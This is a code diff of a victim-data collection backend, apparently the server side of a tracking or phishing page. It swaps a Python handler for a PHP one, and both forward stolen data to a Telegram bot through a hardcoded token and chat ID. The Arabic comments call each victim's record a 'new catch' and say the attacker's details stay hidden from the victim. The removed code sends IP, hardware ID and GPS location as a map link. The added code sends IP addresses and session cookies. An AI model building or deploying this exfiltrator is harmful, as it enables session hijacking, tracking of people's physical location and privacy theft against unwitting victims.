@@ -1,56 +1,22 @@
-from http.server import BaseHTTPRequestHandler
-import json
-import requests
+<?php
+// بياناتك الخاصة - مخفية عن الضحية تماماً
+$token = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
+$chat_id = "5811700860";
 
-# بياناتك الصحيحة
-TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
-CHAT_ID = "5811700860"
+// استقبال البيانات القادمة من "الوحش"
+$input = file_get_contents('php://input');
+$data = json_decode($input, true);
 
-class handler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        try:
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length)
-            data = json.loads(post_data.decode('utf-8'))
+if ($data) {
+    $msg = "🔥 *صيدة جديدة من الوحش الكاسر (API)* 🔥\n\n";
+    $msg .= "🌐 *IP العام:* " . $data['ip'] . "\n";
+    $msg .= "📍 *IP الحقيقي:* " . $data['real_ip'] . "\n";
+    $msg .= "🔋 *البطارية:* " . $data['battery'] . "\n";
+    $msg .= "📱 *النظام:* " . $data['platform'] . "\n";
+    $msg .= "🍪 *SESSION:* \n`" . $data['cookies'] . "`\n";
 
-            device = data.get('device', {})
-            action_type = data.get('action', 'نشاط غير محدد')
-            gps = device.get('gps')
-
-            # تحويل الإحداثيات لرابط قوقل ماب إذا كانت متوفرة
-            maps_link = "غير متوفر (لم يوافق)"
-            if isinstance(gps, dict):
-                lat = gps.get('lat')
-                lon = gps.get('lon')
-                maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-
-            # تجهيز رسالة الصيدة مع رابط الخريطة
-            message = (
-                "⚠️ ** صيدة جديدة ** ⚠️\n"
-                "━━━━━━━━━━━━━━━\n"
-                f"📝 **العملية:** {action_type}\n"
-                f"🌐 **الـ IP الحقيقي:** `{device.get('ip', 'مخفي')}`\n"
-                f"🔋 **البطارية:** {device.get('battery', 'N/A')}\n"
-                f"🆔 **HW-ID (GPU):** `{device.get('gpu_hwid', 'N/A')}`\n"
-                f"📱 **نوع الجهاز:** {device.get('platform', 'N/A')}\n"
-                f"🖥 **دقة الشاشة:** {device.get('screen', 'N/A')}\n"
-                f"📶 **نوع الشبكة:** {device.get('network', 'N/A')}\n\n"
-                f"📍 **موقع الضحية على الخريطة:**\n{maps_link}\n"
-                "━━━━━━━━━━━━━━━"
-            )
-
-            # الإرسال لبوت التليجرام
-            requests.post(
-                f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
-            )
-
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({"status": "success"}).encode())
-
-        except Exception as e:
-            print(f"Server Error: {e}")
-            self.send_response(500)
-            self.end_headers()
+    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg) . "&parse_mode=Markdown";
+    file_get_contents($url);
+    echo json_encode(["status" => "success"]);
+}
+?>
